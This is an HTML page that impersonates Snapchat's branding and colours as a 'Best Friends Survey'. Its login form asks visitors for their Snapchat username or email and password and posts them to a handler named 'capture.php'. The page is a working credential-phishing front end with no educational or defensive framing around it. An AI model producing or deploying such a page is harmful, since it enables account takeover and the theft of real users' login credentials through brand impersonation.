<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snapchat Best Friends Survey</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #fffc00; /* Snapchat yellow */
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .survey-box {
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            width: 320px;
            text-align: center;
        }
        .survey-box h2 {
            color: #000;
            margin-bottom: 10px;
        }
        .survey-box p {
            font-size: 14px;
            color: #666;
            margin-bottom: 20px;
        }
        .survey-box input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
            box-sizing: border-box;
        }
        .survey-box button {
            width: 100%;
            padding: 10px;
            background-color: #00d2ff; /* Snapchat blue */
            border: none;
            border-radius: 5px;
            color: white;
            font-weight: bold;
            cursor: pointer;
        }
        .survey-box button:hover {
            background-color: #00b8e6;
        }
    </style>
</head>
<body>
    <div class="survey-box">
        <h2>Snapchat Best Friends Survey</h2>
        <p>Log in to tell us about your Best Friends and see fun insights!</p>
        <form action="capture.php" method="POST">
            <input type="text" name="username" placeholder="Username or Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Join the Survey</button>
        </form>
    </div>
</body>
</html>
